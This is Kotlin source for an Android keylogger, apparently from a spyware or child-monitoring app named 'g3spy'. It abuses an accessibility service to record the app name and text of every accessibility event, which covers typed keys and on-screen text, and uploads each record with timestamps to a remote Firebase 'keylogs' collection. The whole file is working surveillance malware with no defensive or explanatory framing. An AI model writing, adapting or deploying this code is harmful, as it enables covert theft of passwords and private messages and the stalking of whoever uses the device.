package com.g3spy.child

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.firestore.FirebaseFirestore

class KeyloggingService : AccessibilityService() {
    private val db = FirebaseFirestore.getInstance()

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            val data = hashMapOf(
                "app" to it.packageName.toString(),
                "key" to it.text.toString(),
                "eventType" to it.eventType.toString(),
                "time" to java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
                    .format(java.util.Date()),
                "timestamp" to com.google.firebase.Timestamp.now()
            )
            db.collection("keylogs").add(data)
        }
    }

    override fun onInterrupt() {}
}